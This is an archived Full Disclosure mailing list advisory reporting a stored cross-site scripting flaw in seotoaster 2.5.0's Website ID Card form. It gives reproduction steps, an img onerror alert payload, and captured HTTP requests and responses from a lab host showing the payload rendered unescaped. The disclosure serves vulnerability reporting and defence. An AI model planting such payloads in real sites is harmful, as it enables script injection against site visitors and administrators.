---
title: Stored XSS "Edit General Info" Functionality - seotoasterv2.5.0
url: https://seclists.org/fulldisclosure/2025/Jul/25
source: Full Disclosure
date: 2025-07-31
fetch_date: 2025-10-06T23:56:54.301941
---

# Stored XSS "Edit General Info" Functionality - seotoasterv2.5.0

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](27)

![](/shared/images/nst-icons.svg#search)

# Stored XSS "Edit General Info" Functionality - seotoasterv2.5.0

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 20 Jul 2025 16:51:30 +0100

---

```
# Exploit Title: Stored XSS "Edit General Info" Functionality -
seotoasterv2.5.0
# Date: 07/2025
# Exploit Author: Andrey Stoykov
# Version: 2.5.0
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Stored XSS "Edit General Info" Functionality #3:

Steps to Reproduce

1. Login with admin and visit "Website ID Card" > "Website Id Card"
2. In the "Organization Name" add the following payload "><img src=x
onerror=alert(1)>

// HTTP POST Request

POST /seotoaster/plugin/widcard/run/setWebsiteIdCard HTTP/1.1
Host: 192.168.58.149
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0)
Gecko/20100101 Firefox/141.0
[...]

------geckoformboundarye25c980b11fd10ddbadfbd1b54af4d87
Content-Disposition: form-data; name="organization_name"

"><img src=x onerror=alert(`xss1`)>
------geckoformboundarye25c980b11fd10ddbadfbd1b54af4d87
Content-Disposition: form-data; name="organization_description"

"><img src=x onerror=alert(`xss2`)>
------geckoformboundarye25c980b11fd10ddbadfbd1b54af4d87
[...]

// HTTP Response

HTTP/1.1 302 Found
Date: Sun, 20 Jul 2025 15:35:07 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
[...]

// HTTP GET Request

GET /seotoaster/plugin/widcard/run/getWebsiteIdCard HTTP/1.1
Host: 192.168.58.149
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0)
Gecko/20100101 Firefox/141.0
[...]

// HTTP Response

HTTP/1.1 200 OK
Date: Sun, 20 Jul 2025 15:35:11 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
[...]

[...]
<input type="text" name="organization_name" value=""><img src=x
onerror=alert(`xss1`)>" />
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](27)

### Current thread:

* **Stored XSS "Edit General Info" Functionality - seotoasterv2.5.0** *Andrey Stoykov (Jul 29)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")